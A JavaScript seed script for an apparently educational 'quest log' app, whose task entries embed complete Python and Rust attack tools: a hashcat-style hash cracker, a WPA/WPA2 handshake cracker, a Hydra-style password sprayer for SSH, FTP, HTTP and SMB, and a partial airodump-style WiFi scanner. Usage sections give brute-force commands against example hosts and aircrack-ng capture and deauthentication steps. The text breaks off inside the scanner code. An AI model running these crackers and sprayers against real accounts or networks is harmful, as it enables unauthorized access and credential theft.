import Database from 'better-sqlite3';

const sqlite = new Database('data/quest-log.db');

const insertPath = sqlite.prepare(
	'INSERT INTO paths (name, description, color, created_at) VALUES (?, ?, ?, ?)'
);
const insertModule = sqlite.prepare(
	'INSERT INTO modules (path_id, name, description, order_index, created_at) VALUES (?, ?, ?, ?, ?)'
);
const insertTask = sqlite.prepare(
	'INSERT INTO tasks (module_id, title, description, details, order_index, created_at) VALUES (?, ?, ?, ?, ?, ?)'
);

const now = Date.now();

// ============================================================================
// PASSWORD CRACKING & WIFI TOOLS
// ============================================================================
const path1 = insertPath.run(
	'Reimplement: Password & WiFi Cracking',
	'Build hashcat-style password crackers, WiFi auditing tools (aircrack-ng style), and understand the cryptography behind password attacks.',
	'pink',
	now
);

// Module 1: Password Cracking
const mod1 = insertModule.run(path1.lastInsertRowid, 'Build Password Crackers', 'Implement hashcat-style multi-algorithm password cracking', 0, now);

insertTask.run(mod1.lastInsertRowid, 'Build Multi-Algorithm Hash Cracker', 'Implement a password hash cracker with support for MD5, SHA-1, SHA-256, NTLM, and bcrypt algorithms, featuring dictionary attacks, rule-based mutations, and optimized hash computation using SIMD instructions', `## Hashcat Clone - Multi-Algorithm Cracker

### How Hashcat Works
\`\`\`
1. Load target hashes
2. Auto-detect or specify hash type
3. Attack modes:
   - Dictionary: Try each word
   - Rules: Mutate words (l33t, append numbers)
   - Mask: Brute-force with pattern
   - Combinator: Combine wordlists
4. GPU acceleration via OpenCL/CUDA
\`\`\`

### Full Implementation (Python)
\`\`\`python
#!/usr/bin/env python3
"""
hashcrack.py - Multi-algorithm password cracker
Supports: MD5, SHA1, SHA256, SHA512, NTLM, bcrypt
"""

import argparse
import hashlib
import binascii
import itertools
import string
import time
import sys
from concurrent.futures import ProcessPoolExecutor, as_completed
from typing import Optional, List, Callable, Generator
from dataclasses import dataclass

# Optional bcrypt support
try:
    import bcrypt
    BCRYPT_AVAILABLE = True
except ImportError:
    BCRYPT_AVAILABLE = False

@dataclass
class HashType:
    name: str
    mode: int
    hash_func: Callable
    example: str

class HashCracker:
    # Supported hash types (like hashcat -m modes)
    HASH_TYPES = {
        0: HashType('MD5', 0, lambda p: hashlib.md5(p.encode()).hexdigest(), '8743b52063cd84097a65d1633f5c74f5'),
        100: HashType('SHA1', 100, lambda p: hashlib.sha1(p.encode()).hexdigest(), 'b89eaac7e61417341b710b727768294d0e6a277b'),
        1400: HashType('SHA256', 1400, lambda p: hashlib.sha256(p.encode()).hexdigest(), ''),
        1700: HashType('SHA512', 1700, lambda p: hashlib.sha512(p.encode()).hexdigest(), ''),
        1000: HashType('NTLM', 1000, lambda p: binascii.hexlify(hashlib.new('md4', p.encode('utf-16le')).digest()).decode(), '32ed87bdb5fdc5e9cba88547376818d4'),
        3200: HashType('bcrypt', 3200, None, '$2a$05$...'),  # Special handling
    }

    def __init__(self, hash_file: str, mode: int = None,
                 wordlist: str = None, rules: List[str] = None,
                 mask: str = None, threads: int = 4):
        self.hash_file = hash_file
        self.mode = mode
        self.wordlist = wordlist
        self.rules = rules or []
        self.mask = mask
        self.threads = threads

        self.target_hashes = set()
        self.cracked = {}
        self.hash_type = None
        self.attempts = 0
        self.start_time = 0

    def load_hashes(self) -> int:
        """Load target hashes from file"""
        with open(self.hash_file, 'r') as f:
            for line in f:
                h = line.strip().lower()
                if h:
                    self.target_hashes.add(h)
        return len(self.target_hashes)

    def detect_hash_type(self, sample: str) -> Optional[int]:
        """Auto-detect hash type from length/format"""
        sample = sample.lower()

        # bcrypt
        if sample.startswith('$2'):
            return 3200

        # By length
        length_map = {
            32: 0,    # MD5 or NTLM
            40: 100,  # SHA1
            64: 1400, # SHA256
            128: 1700 # SHA512
        }

        if len(sample) in length_map:
            return length_map[len(sample)]

        return None

    def hash_password(self, password: str) -> str:
        """Hash password using current algorithm"""
        if self.mode == 3200:  # bcrypt
            if not BCRYPT_AVAILABLE:
                return None
            # For bcrypt, we verify against the hash
            return None

        return self.HASH_TYPES[self.mode].hash_func(password)

    def check_bcrypt(self, password: str, hash_str: str) -> bool:
        """Check bcrypt hash"""
        try:
            return bcrypt.checkpw(password.encode(), hash_str.encode())
        except:
            return False

    def apply_rules(self, word: str) -> Generator[str, None, None]:
        """Apply mutation rules to word"""
        yield word  # Original

        for rule in self.rules:
            if rule == 'l':  # lowercase
                yield word.lower()
            elif rule == 'u':  # uppercase
                yield word.upper()
            elif rule == 'c':  # capitalize
                yield word.capitalize()
            elif rule == 'r':  # reverse
                yield word[::-1]
            elif rule == 'd':  # duplicate
                yield word + word
            elif rule == '$':  # append common suffixes
                for suffix in ['1', '123', '!', '2024', '2023', '@', '#']:
                    yield word + suffix
            elif rule == '^':  # prepend common prefixes
                for prefix in ['1', '123', '@', '#']:
                    yield prefix + word
            elif rule == 's':  # l33t speak
                leet = {'a': '4', 'e': '3', 'i': '1', 'o': '0', 's': '5', 't': '7'}
                result = word
                for char, replacement in leet.items():
                    result = result.replace(char, replacement)
                yield result

    def generate_mask(self, mask: str) -> Generator[str, None, None]:
        """Generate passwords from mask pattern
        ?l = lowercase, ?u = uppercase, ?d = digit, ?s = special, ?a = all
        """
        charsets = {
            'l': string.ascii_lowercase,
            'u': string.ascii_uppercase,
            'd': string.digits,
            's': '!@#$%^&*()_+-=[]{}|;:,.<>?',
            'a': string.ascii_letters + string.digits + '!@#$%^&*'
        }

        # Parse mask
        parts = []
        i = 0
        while i < len(mask):
            if mask[i] == '?' and i + 1 < len(mask):
                charset_key = mask[i + 1]
                if charset_key in charsets:
                    parts.append(charsets[charset_key])
                    i += 2
                    continue
            parts.append(mask[i])
            i += 1

        # Generate combinations
        for combo in itertools.product(*parts):
            yield ''.join(combo)

    def dictionary_attack(self) -> None:
        """Run dictionary attack"""
        print(f"[*] Starting dictionary attack with {self.wordlist}")

        with open(self.wordlist, 'r', errors='ignore') as f:
            for line in f:
                word = line.strip()
                if not word:
                    continue

                # Apply rules
                for candidate in self.apply_rules(word):
                    self.check_candidate(candidate)

                    if len(self.cracked) == len(self.target_hashes):
                        return  # All cracked

    def mask_attack(self) -> None:
        """Run mask/brute-force attack"""
        print(f"[*] Starting mask attack: {self.mask}")

        for candidate in self.generate_mask(self.mask):
            self.check_candidate(candidate)

            if len(self.cracked) == len(self.target_hashes):
                return

    def check_candidate(self, password: str) -> bool:
        """Check if password matches any target hash"""
        self.attempts += 1

        # Progress update
        if self.attempts % 100000 == 0:
            elapsed = time.time() - self.start_time
            rate = self.attempts / elapsed if elapsed > 0 else 0
            sys.stdout.write(f"\\r[*] Tried {self.attempts:,} passwords ({rate:,.0f}/s) - Cracked: {len(self.cracked)}")
            sys.stdout.flush()

        if self.mode == 3200:  # bcrypt
            for h in self.target_hashes - set(self.cracked.keys()):
                if self.check_bcrypt(password, h):
                    self.cracked[h] = password
                    print(f"\\n[+] CRACKED: {h} -> {password}")
                    return True
        else:
            hashed = self.hash_password(password)
            if hashed in self.target_hashes and hashed not in self.cracked:
                self.cracked[hashed] = password
                print(f"\\n[+] CRACKED: {hashed} -> {password}")
                return True

        return False

    def run(self) -> dict:
        """Run the cracking session"""
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║              HashCrack - Password Cracker                 ║
╚═══════════════════════════════════════════════════════════╝
        """)

        # Load hashes
        count = self.load_hashes()
        print(f"[*] Loaded {count} hashes")

        # Detect or verify hash type
        if self.mode is None:
            sample = next(iter(self.target_hashes))
            self.mode = self.detect_hash_type(sample)
            if self.mode is None:
                print("[-] Could not detect hash type. Use -m to specify.")
                return {}

        self.hash_type = self.HASH_TYPES.get(self.mode)
        if not self.hash_type:
            print(f"[-] Unknown hash mode: {self.mode}")
            return {}

        print(f"[*] Hash type: {self.hash_type.name} (mode {self.mode})")

        self.start_time = time.time()

        # Run attack
        if self.wordlist:
            self.dictionary_attack()
        elif self.mask:
            self.mask_attack()
        else:
            print("[-] No attack mode specified. Use -w or --mask")
            return {}

        # Results
        elapsed = time.time() - self.start_time
        print(f"\\n\\n[*] Session completed in {elapsed:.2f}s")
        print(f"[*] Attempts: {self.attempts:,}")
        print(f"[*] Speed: {self.attempts/elapsed:,.0f} H/s")
        print(f"[*] Cracked: {len(self.cracked)}/{count}")

        return self.cracked


def main():
    parser = argparse.ArgumentParser(
        description='HashCrack - Password Cracker',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Hash Modes (-m):
  0     MD5
  100   SHA1
  1000  NTLM
  1400  SHA256
  1700  SHA512
  3200  bcrypt

Rules (-r):
  l  lowercase       u  uppercase      c  capitalize
  r  reverse         d  duplicate      $  append suffix
  ^  prepend prefix  s  l33t speak

Mask (?):
  ?l  lowercase      ?u  uppercase     ?d  digit
  ?s  special        ?a  all chars

Examples:
  %(prog)s hashes.txt -w rockyou.txt
  %(prog)s hashes.txt -w words.txt -r l -r u -r '$'
  %(prog)s hashes.txt --mask '?l?l?l?l?d?d?d?d'
  %(prog)s ntlm.txt -m 1000 -w wordlist.txt
        '''
    )
    parser.add_argument('hashfile', help='File containing hashes')
    parser.add_argument('-m', '--mode', type=int, help='Hash mode')
    parser.add_argument('-w', '--wordlist', help='Wordlist file')
    parser.add_argument('-r', '--rules', action='append', default=[], help='Rules to apply')
    parser.add_argument('--mask', help='Mask for brute-force')
    parser.add_argument('-t', '--threads', type=int, default=4, help='Threads')
    parser.add_argument('-o', '--output', help='Output file for cracked')
    args = parser.parse_args()

    cracker = HashCracker(
        args.hashfile,
        args.mode,
        args.wordlist,
        args.rules,
        args.mask,
        args.threads
    )

    cracked = cracker.run()

    if args.output and cracked:
        with open(args.output, 'w') as f:
            for h, p in cracked.items():
                f.write(f"{h}:{p}\\n")
        print(f"[+] Saved to {args.output}")


if __name__ == '__main__':
    main()
\`\`\`

### Rust Implementation (GPU-ready structure)
\`\`\`rust
// src/main.rs - High-performance hash cracker
use rayon::prelude::*;
use md5::{Md5, Digest};
use sha1::Sha1;
use sha2::Sha256;
use std::collections::HashSet;
use std::sync::atomic::{AtomicU64, AtomicBool, Ordering};
use std::sync::Arc;

struct Cracker {
    targets: HashSet<String>,
    mode: u32,
    found: Arc<AtomicBool>,
    attempts: Arc<AtomicU64>,
}

impl Cracker {
    fn hash(&self, password: &str) -> String {
        match self.mode {
            0 => {  // MD5
                let mut hasher = Md5::new();
                hasher.update(password.as_bytes());
                format!("{:x}", hasher.finalize())
            }
            100 => {  // SHA1
                let mut hasher = Sha1::new();
                hasher.update(password.as_bytes());
                format!("{:x}", hasher.finalize())
            }
            1400 => {  // SHA256
                let mut hasher = Sha256::new();
                hasher.update(password.as_bytes());
                format!("{:x}", hasher.finalize())
            }
            _ => String::new()
        }
    }

    fn crack_wordlist(&self, wordlist: &[String]) -> Option<(String, String)> {
        wordlist.par_iter()
            .find_map_any(|word| {
                if self.found.load(Ordering::Relaxed) {
                    return None;
                }

                self.attempts.fetch_add(1, Ordering::Relaxed);
                let hash = self.hash(word);

                if self.targets.contains(&hash) {
                    self.found.store(true, Ordering::Relaxed);
                    return Some((hash, word.clone()));
                }
                None
            })
    }
}
\`\`\`

### Usage
\`\`\`bash
# MD5 dictionary attack
python3 hashcrack.py hashes.txt -w rockyou.txt

# NTLM with rules
python3 hashcrack.py ntlm.txt -m 1000 -w words.txt -r l -r '$'

# Brute-force 8 char lowercase
python3 hashcrack.py hashes.txt --mask '?l?l?l?l?l?l?l?l'

# SHA256 with output
python3 hashcrack.py sha256.txt -m 1400 -w wordlist.txt -o cracked.txt
\`\`\``, 0, now);

insertTask.run(mod1.lastInsertRowid, 'Build WiFi Handshake Cracker', 'Parse captured 4-way EAPOL handshakes, derive PMK from passphrase candidates using PBKDF2-SHA1, compute PTK, and verify MIC to identify the correct WPA/WPA2 password through dictionary-based cracking', `## WiFi Handshake Cracker

### How WPA/WPA2 Cracking Works
\`\`\`
1. Capture 4-way handshake (EAPOL)
2. Extract: SSID, AP MAC, Client MAC, ANonce, SNonce, MIC
3. For each password guess:
   - Derive PMK = PBKDF2(password, SSID, 4096, 256)
   - Derive PTK from PMK + nonces + MACs
   - Calculate MIC using PTK
   - Compare with captured MIC
4. Match = password found
\`\`\`

### Implementation (Python)
\`\`\`python
#!/usr/bin/env python3
"""
wificrack.py - WPA/WPA2 Handshake Cracker
Cracks captured handshakes from pcap files
"""

import argparse
import hashlib
import hmac
import struct
from pbkdf2 import PBKDF2
from scapy.all import rdpcap, EAPOL, Dot11, Dot11Beacon, Dot11Elt
from typing import Optional, Tuple
import time
import sys

class HandshakeInfo:
    def __init__(self):
        self.ssid: str = ""
        self.ap_mac: bytes = b""
        self.client_mac: bytes = b""
        self.anonce: bytes = b""
        self.snonce: bytes = b""
        self.mic: bytes = b""
        self.eapol_frame: bytes = b""
        self.key_version: int = 0

class WPACracker:
    def __init__(self, pcap_file: str, wordlist: str):
        self.pcap_file = pcap_file
        self.wordlist = wordlist
        self.handshake: Optional[HandshakeInfo] = None
        self.attempts = 0
        self.start_time = 0

    def extract_handshake(self) -> Optional[HandshakeInfo]:
        """Extract handshake from pcap"""
        print(f"[*] Reading {self.pcap_file}...")

        packets = rdpcap(self.pcap_file)
        handshake = HandshakeInfo()

        eapol_packets = []

        for pkt in packets:
            # Get SSID from beacon
            if pkt.haslayer(Dot11Beacon):
                elt = pkt.getlayer(Dot11Elt)
                while elt:
                    if elt.ID == 0:  # SSID
                        handshake.ssid = elt.info.decode('utf-8', errors='ignore')
                        handshake.ap_mac = bytes.fromhex(pkt.addr2.replace(':', ''))
                    elt = elt.payload.getlayer(Dot11Elt)

            # Collect EAPOL packets
            if pkt.haslayer(EAPOL):
                eapol_packets.append(pkt)

        if len(eapol_packets) < 2:
            print("[-] Not enough EAPOL packets for handshake")
            return None

        # Parse EAPOL packets (simplified)
        for pkt in eapol_packets:
            eapol = bytes(pkt[EAPOL])

            # Key info is at offset 5-6
            if len(eapol) > 80:
                key_info = struct.unpack('>H', eapol[5:7])[0]

                # Message 1: AP -> Client (has ANonce)
                if key_info & 0x0080 == 0:  # No MIC
                    handshake.anonce = eapol[17:49]
                    handshake.ap_mac = bytes.fromhex(pkt.addr2.replace(':', ''))

                # Message 2: Client -> AP (has SNonce and MIC)
                elif key_info & 0x0100:  # MIC present
                    handshake.snonce = eapol[17:49]
                    handshake.mic = eapol[81:97]
                    handshake.client_mac = bytes.fromhex(pkt.addr2.replace(':', ''))
                    handshake.key_version = (key_info >> 0) & 0x0007

                    # Store EAPOL frame with MIC zeroed for verification
                    eapol_copy = bytearray(eapol)
                    eapol_copy[81:97] = b'\\x00' * 16
                    handshake.eapol_frame = bytes(eapol_copy)

        if handshake.anonce and handshake.snonce and handshake.mic:
            print(f"[+] Extracted handshake for: {handshake.ssid}")
            print(f"    AP MAC: {handshake.ap_mac.hex()}")
            print(f"    Client MAC: {handshake.client_mac.hex()}")
            return handshake

        print("[-] Incomplete handshake")
        return None

    def derive_pmk(self, password: str, ssid: str) -> bytes:
        """Derive PMK from password and SSID using PBKDF2"""
        return hashlib.pbkdf2_hmac('sha1', password.encode(), ssid.encode(), 4096, 32)

    def derive_ptk(self, pmk: bytes, ap_mac: bytes, client_mac: bytes,
                   anonce: bytes, snonce: bytes) -> bytes:
        """Derive PTK from PMK and nonces"""
        # PTK = PRF-512(PMK, "Pairwise key expansion", Min(AA,SA) || Max(AA,SA) || Min(ANonce,SNonce) || Max(ANonce,SNonce))

        # Sort MACs and nonces
        if ap_mac < client_mac:
            mac_pair = ap_mac + client_mac
        else:
            mac_pair = client_mac + ap_mac

        if anonce < snonce:
            nonce_pair = anonce + snonce
        else:
            nonce_pair = snonce + anonce

        data = mac_pair + nonce_pair

        # PRF-512 (pseudo-random function)
        ptk = b""
        for i in range(4):
            ptk += hmac.new(
                pmk,
                b"Pairwise key expansion\\x00" + data + bytes([i]),
                hashlib.sha1
            ).digest()

        return ptk[:64]  # 512 bits

    def calculate_mic(self, ptk: bytes, eapol_frame: bytes, version: int) -> bytes:
        """Calculate MIC for EAPOL frame"""
        kck = ptk[:16]  # Key Confirmation Key

        if version == 1:  # HMAC-MD5
            return hmac.new(kck, eapol_frame, hashlib.md5).digest()
        else:  # HMAC-SHA1
            return hmac.new(kck, eapol_frame, hashlib.sha1).digest()[:16]

    def try_password(self, password: str) -> bool:
        """Try a password against the handshake"""
        self.attempts += 1

        # Derive keys
        pmk = self.derive_pmk(password, self.handshake.ssid)
        ptk = self.derive_ptk(
            pmk,
            self.handshake.ap_mac,
            self.handshake.client_mac,
            self.handshake.anonce,
            self.handshake.snonce
        )

        # Calculate and compare MIC
        mic = self.calculate_mic(ptk, self.handshake.eapol_frame, self.handshake.key_version)

        return mic == self.handshake.mic

    def crack(self) -> Optional[str]:
        """Run cracking attack"""
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║            WiFi Handshake Cracker                         ║
╚═══════════════════════════════════════════════════════════╝
        """)

        # Extract handshake
        self.handshake = self.extract_handshake()
        if not self.handshake:
            return None

        print(f"[*] Starting dictionary attack...")
        self.start_time = time.time()

        with open(self.wordlist, 'r', errors='ignore') as f:
            for line in f:
                password = line.strip()
                if len(password) < 8 or len(password) > 63:
                    continue  # WPA passwords must be 8-63 chars

                if self.attempts % 1000 == 0:
                    elapsed = time.time() - self.start_time
                    rate = self.attempts / elapsed if elapsed > 0 else 0
                    sys.stdout.write(f"\\r[*] Tried {self.attempts:,} passwords ({rate:.0f}/s)")
                    sys.stdout.flush()

                if self.try_password(password):
                    elapsed = time.time() - self.start_time
                    print(f"\\n\\n[+] PASSWORD FOUND!")
                    print(f"[+] SSID: {self.handshake.ssid}")
                    print(f"[+] Password: {password}")
                    print(f"[+] Time: {elapsed:.2f}s")
                    print(f"[+] Attempts: {self.attempts:,}")
                    return password

        print(f"\\n[-] Password not found in wordlist")
        return None


def main():
    parser = argparse.ArgumentParser(description='WiFi Handshake Cracker')
    parser.add_argument('pcap', help='PCAP file with handshake')
    parser.add_argument('-w', '--wordlist', required=True, help='Wordlist file')
    args = parser.parse_args()

    cracker = WPACracker(args.pcap, args.wordlist)
    cracker.crack()


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# Capture handshake first (using aircrack-ng suite)
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
sudo airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon
# Wait for handshake or deauth: aireplay-ng -0 1 -a AA:BB:CC:DD:EE:FF wlan0mon

# Crack with our tool
python3 wificrack.py capture.pcap -w rockyou.txt

# Or use hashcat for GPU acceleration (convert first)
# cap2hccapx capture.cap capture.hccapx
# hashcat -m 22000 capture.hccapx wordlist.txt
\`\`\``, 1, now);

insertTask.run(mod1.lastInsertRowid, 'Build Online Password Sprayer (Hydra-style)', 'Implement concurrent password spraying against network services including SSH, FTP, SMB, RDP, and HTTP forms with configurable parallelism, timing controls, and success detection for various protocols', `## Hydra Clone - Network Password Sprayer

### How Hydra Works
\`\`\`
1. Target service (SSH, FTP, HTTP, SMB, etc.)
2. User list and password list
3. Parallel connections
4. Try each user:password combination
5. Detect success/failure from response
\`\`\`

### Full Implementation (Python)
\`\`\`python
#!/usr/bin/env python3
"""
hydra_clone.py - Network Password Sprayer
Supports: SSH, FTP, HTTP-GET, HTTP-POST, SMB
"""

import argparse
import socket
import threading
from concurrent.futures import ThreadPoolExecutor, as_completed
from dataclasses import dataclass
from typing import List, Optional, Tuple
import time
import sys

# Protocol-specific imports
import ftplib
try:
    import paramiko
    SSH_AVAILABLE = True
except ImportError:
    SSH_AVAILABLE = False

import requests
from requests.auth import HTTPBasicAuth

try:
    from impacket.smbconnection import SMBConnection
    SMB_AVAILABLE = True
except ImportError:
    SMB_AVAILABLE = False

@dataclass
class Credential:
    username: str
    password: str

@dataclass
class Result:
    credential: Credential
    success: bool
    message: str

class ProtocolHandler:
    """Base class for protocol handlers"""
    def try_login(self, target: str, port: int, cred: Credential) -> Result:
        raise NotImplementedError

class SSHHandler(ProtocolHandler):
    def try_login(self, target: str, port: int, cred: Credential) -> Result:
        if not SSH_AVAILABLE:
            return Result(cred, False, "paramiko not installed")

        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(
                target,
                port=port,
                username=cred.username,
                password=cred.password,
                timeout=10,
                allow_agent=False,
                look_for_keys=False
            )
            client.close()
            return Result(cred, True, "Login successful")
        except paramiko.AuthenticationException:
            return Result(cred, False, "Authentication failed")
        except Exception as e:
            return Result(cred, False, str(e))

class FTPHandler(ProtocolHandler):
    def try_login(self, target: str, port: int, cred: Credential) -> Result:
        try:
            ftp = ftplib.FTP()
            ftp.connect(target, port, timeout=10)
            ftp.login(cred.username, cred.password)
            ftp.quit()
            return Result(cred, True, "Login successful")
        except ftplib.error_perm:
            return Result(cred, False, "Authentication failed")
        except Exception as e:
            return Result(cred, False, str(e))

class HTTPBasicHandler(ProtocolHandler):
    def __init__(self, path: str = "/"):
        self.path = path

    def try_login(self, target: str, port: int, cred: Credential) -> Result:
        try:
            scheme = "https" if port == 443 else "http"
            url = f"{scheme}://{target}:{port}{self.path}"

            resp = requests.get(
                url,
                auth=HTTPBasicAuth(cred.username, cred.password),
                timeout=10,
                verify=False
            )

            if resp.status_code != 401:
                return Result(cred, True, f"Status {resp.status_code}")
            return Result(cred, False, "401 Unauthorized")
        except Exception as e:
            return Result(cred, False, str(e))

class HTTPPostHandler(ProtocolHandler):
    def __init__(self, path: str, user_field: str, pass_field: str,
                 fail_string: str):
        self.path = path
        self.user_field = user_field
        self.pass_field = pass_field
        self.fail_string = fail_string

    def try_login(self, target: str, port: int, cred: Credential) -> Result:
        try:
            scheme = "https" if port == 443 else "http"
            url = f"{scheme}://{target}:{port}{self.path}"

            data = {
                self.user_field: cred.username,
                self.pass_field: cred.password
            }

            resp = requests.post(url, data=data, timeout=10, verify=False,
                               allow_redirects=False)

            if self.fail_string not in resp.text:
                return Result(cred, True, "Login successful")
            return Result(cred, False, "Login failed")
        except Exception as e:
            return Result(cred, False, str(e))

class SMBHandler(ProtocolHandler):
    def try_login(self, target: str, port: int, cred: Credential) -> Result:
        if not SMB_AVAILABLE:
            return Result(cred, False, "impacket not installed")

        try:
            conn = SMBConnection(target, target, timeout=10)
            conn.login(cred.username, cred.password)
            conn.logoff()
            return Result(cred, True, "Login successful")
        except Exception as e:
            if "STATUS_LOGON_FAILURE" in str(e):
                return Result(cred, False, "Authentication failed")
            return Result(cred, False, str(e))

class HydraClone:
    PROTOCOLS = {
        'ssh': (SSHHandler, 22),
        'ftp': (FTPHandler, 21),
        'http-get': (HTTPBasicHandler, 80),
        'https-get': (HTTPBasicHandler, 443),
        'smb': (SMBHandler, 445),
    }

    def __init__(self, target: str, port: int, protocol: str,
                 users: List[str], passwords: List[str],
                 threads: int = 16, **kwargs):
        self.target = target
        self.port = port
        self.protocol = protocol
        self.users = users
        self.passwords = passwords
        self.threads = threads
        self.kwargs = kwargs

        self.found: List[Credential] = []
        self.attempts = 0
        self.lock = threading.Lock()
        self.start_time = 0

        # Initialize handler
        if protocol in ['http-post']:
            self.handler = HTTPPostHandler(
                kwargs.get('path', '/login'),
                kwargs.get('user_field', 'username'),
                kwargs.get('pass_field', 'password'),
                kwargs.get('fail_string', 'Invalid')
            )
        elif protocol in ['http-get', 'https-get']:
            self.handler = HTTPBasicHandler(kwargs.get('path', '/'))
        else:
            handler_class, default_port = self.PROTOCOLS.get(protocol, (None, None))
            if handler_class:
                self.handler = handler_class()
                if self.port == 0:
                    self.port = default_port
            else:
                raise ValueError(f"Unknown protocol: {protocol}")

    def try_credential(self, cred: Credential) -> Result:
        """Try single credential"""
        result = self.handler.try_login(self.target, self.port, cred)

        with self.lock:
            self.attempts += 1
            if self.attempts % 50 == 0:
                elapsed = time.time() - self.start_time
                rate = self.attempts / elapsed if elapsed > 0 else 0
                sys.stdout.write(f"\\r[*] Attempts: {self.attempts} ({rate:.1f}/s) Found: {len(self.found)}")
                sys.stdout.flush()

        return result

    def run(self) -> List[Credential]:
        """Run the attack"""
        print(f"""
╔═══════════════════════════════════════════════════════════╗
║              Hydra Clone - Password Sprayer               ║
╚═══════════════════════════════════════════════════════════╝
[*] Target: {self.target}:{self.port}
[*] Protocol: {self.protocol}
[*] Users: {len(self.users)}, Passwords: {len(self.passwords)}
[*] Total combinations: {len(self.users) * len(self.passwords)}
[*] Threads: {self.threads}
        """)

        # Generate all credentials
        credentials = [
            Credential(user, passwd)
            for user in self.users
            for passwd in self.passwords
        ]

        self.start_time = time.time()

        with ThreadPoolExecutor(max_workers=self.threads) as executor:
            futures = {executor.submit(self.try_credential, cred): cred
                      for cred in credentials}

            for future in as_completed(futures):
                result = future.result()
                if result.success:
                    self.found.append(result.credential)
                    print(f"\\n[+] FOUND: {result.credential.username}:{result.credential.password}")

        elapsed = time.time() - self.start_time
        print(f"\\n\\n[*] Attack completed in {elapsed:.2f}s")
        print(f"[*] {len(self.found)} valid credential(s) found")

        return self.found


def load_file(path: str) -> List[str]:
    with open(path, 'r', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]


def main():
    parser = argparse.ArgumentParser(
        description='Hydra Clone - Network Password Sprayer',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog='''
Protocols:
  ssh, ftp, http-get, https-get, http-post, smb

Examples:
  %(prog)s -t 192.168.1.1 -s ssh -l admin -P passwords.txt
  %(prog)s -t 192.168.1.1 -s ftp -L users.txt -P passwords.txt
  %(prog)s -t 192.168.1.1 -s http-post -L users.txt -p admin \\
           --path /login --user-field user --pass-field pass --fail "Invalid"
        '''
    )
    parser.add_argument('-t', '--target', required=True, help='Target host')
    parser.add_argument('-p', '--port', type=int, default=0, help='Port')
    parser.add_argument('-s', '--service', required=True, help='Protocol/service')
    parser.add_argument('-l', '--login', help='Single username')
    parser.add_argument('-L', '--login-file', help='Username file')
    parser.add_argument('-P', '--password-file', help='Password file')
    parser.add_argument('--password', '-pw', help='Single password')
    parser.add_argument('-T', '--threads', type=int, default=16, help='Threads')
    parser.add_argument('--path', default='/', help='HTTP path')
    parser.add_argument('--user-field', default='username', help='HTTP user field')
    parser.add_argument('--pass-field', default='password', help='HTTP pass field')
    parser.add_argument('--fail', default='Invalid', help='HTTP fail string')
    args = parser.parse_args()

    # Build user and password lists
    users = []
    if args.login:
        users = [args.login]
    elif args.login_file:
        users = load_file(args.login_file)
    else:
        parser.error("Specify -l or -L for usernames")

    passwords = []
    if args.password:
        passwords = [args.password]
    elif args.password_file:
        passwords = load_file(args.password_file)
    else:
        parser.error("Specify -pw or -P for passwords")

    hydra = HydraClone(
        args.target,
        args.port,
        args.service,
        users,
        passwords,
        args.threads,
        path=args.path,
        user_field=args.user_field,
        pass_field=args.pass_field,
        fail_string=args.fail
    )

    hydra.run()


if __name__ == '__main__':
    main()
\`\`\`

### Usage
\`\`\`bash
# SSH brute force
python3 hydra_clone.py -t 10.30.30.100 -s ssh -l root -P passwords.txt

# FTP with user list
python3 hydra_clone.py -t 10.30.30.100 -s ftp -L users.txt -P passwords.txt

# HTTP POST form
python3 hydra_clone.py -t 10.30.30.100 -s http-post -L users.txt -P pass.txt \\
    --path /login --user-field username --pass-field password --fail "Invalid"

# SMB
python3 hydra_clone.py -t 10.30.30.100 -s smb -L users.txt -P passwords.txt
\`\`\``, 2, now);

// Module 2: WiFi Auditing Tools
const mod2 = insertModule.run(path1.lastInsertRowid, 'Build WiFi Auditing Tools', 'Reimplement aircrack-ng suite functionality', 1, now);

insertTask.run(mod2.lastInsertRowid, 'Build WiFi Scanner (airodump-ng style)', 'Capture 802.11 frames in monitor mode to enumerate access points, connected clients, signal strengths, encryption types, and channel usage, displaying real-time network discovery similar to airodump-ng', `## WiFi Scanner - Airodump-ng Clone

### How WiFi Scanning Works
\`\`\`
1. Put interface in monitor mode
2. Hop across channels
3. Capture and parse:
   - Beacon frames (AP info)
   - Probe requests (client info)
   - Data frames (activity)
4. Display in real-time
\`\`\`

### Implementation (Python with Scapy)
\`\`\`python
#!/usr/bin/env python3
"""
wifiscan.py - WiFi Network Scanner
Requires monitor mode interface
"""

import argparse
import os
import sys
import time
import threading
from collections import defaultdict
from datetime import datetime
from scapy.all import *
from scapy.layers.dot11 import Dot11, Dot11Beacon, Dot11ProbeReq, Dot11ProbeResp, Dot11Elt

class AccessPoint:
    def __init__(self, bssid: str):
        self.bssid = bssid
        self.ssid = ""
        self.channel = 0
        self.encryption = "OPN"
        self.cipher = ""
        self.auth = ""
        self.power = -100
        self.beacons = 0
        self.data = 0
        self.clients = set()
        self.last_seen = datetime.now()

class Client:
    def __init__(self, mac: str):
        self.mac = mac
        self.bssid = ""
        self.power = -100
        self.frames = 0
        self.probes = []
        self.last_seen = datetime.now()

class WiFiScanner:
    def __init__(self, interface: str):
        self.interface = interface
        self.aps = {}  # bssid -> AccessPoint
        self.clients = {}  # mac -> Client
        self.channel = 1
        self.running = True
        self.lock = threading.Lock()

    def parse_crypto(self, pkt) -> tuple:
        """Parse encryption from beacon/probe response"""
        crypto = "OPN"
        cipher = ""
        auth = ""

        # Check for RSN (WPA2)
        rsn = pkt.getlayer(Dot11Elt, ID=48)
        if rsn:
            crypto = "WPA2"
            # Parse RSN info element for cipher/auth
            cipher = "CCMP"
            auth = "PSK"

        # Check for WPA
        wpa = None
        elt = pkt.getlayer(Dot11Elt)
        while elt:
            if elt.ID == 221 and elt.info.startswith(b'\\x00\\x50\\xf2\\x01'):
                wpa = elt
                break
            elt = elt.payload.getlayer(Dot11Elt)

        if wpa:
            if crypto == "OPN":
                crypto = "WPA"
            else:
                crypto = "WPA2 WPA"

        # Check for WEP
        cap = pkt.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}")
        if 'privacy' in cap.lower() and crypto == "OPN":
            crypto = "WEP"

